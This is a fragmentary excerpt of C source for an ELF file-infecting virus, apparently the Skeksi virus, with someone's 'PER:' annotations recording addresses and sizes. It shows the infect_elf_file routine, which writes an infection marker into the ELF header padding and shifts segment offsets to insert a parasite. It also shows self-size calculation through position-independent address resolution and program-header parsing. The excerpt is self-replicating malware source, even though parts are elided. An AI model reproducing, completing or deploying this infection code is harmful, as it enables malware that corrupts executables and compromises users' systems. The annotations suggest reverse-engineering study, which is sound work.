...
Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
{
	...
	*(uint32_t *)&mem[EI_PAD] = MAGIC_NUMBER; // Last 7 bytes of the first 16 bytes of the ELF header is EI_PAD
	...
	phdr[0].p_offset += paddingSize; // PER: 40+virussize(.text section)
...
{	
	int i;
	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code); //PER: f1 = 0x402d5d
	void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker); //PER: f2 = 0x402d72 
	Elf64_Addr _start_addr = PIC_RESOLVE_ADDR(&_start); //PER: _start_addr = dec(0x40019c) = 4194716
	elf->mem = (uint8_t *)_start_addr; //PER: elf->mem = 0x40019c
	elf->size = (char *)&end_code - (char *)&_start; //PER: elf->size = 11201
	elf->size += (int)((char *)f2 - (char *)f1); //PER: elf->size = 11201 + 21
	//elf->size += 1024; // So we have .rodata included in parasite insertion
	elf->size += RODATA_PADDING; //SKEKSI_BYTECODE_SIZE; //PER: elf->size = 11201 + 21 + 17000
	//PER: size of skeksi banner is 15341
	return 0;
}
		...
		switch(elf->phdr[i].p_type) {	
			case PT_LOAD:
				switch(!!elf->phdr[i].p_offset) {
					//PER: TODO: The code has assumed that there are only 2 LOAD segments. So now modify the code to read the permissions(RE and RW) and then perform the cases.
					case 0:
				...
				break;
			case PT_DYNAMIC:
				elf->dyn = (Elf64_Dyn *)&elf->mem[elf->phdr[i].p_offset]; //PER: there are 8 entries in the .dynamic section
				break;
		}	
    }
	elf->st = st;
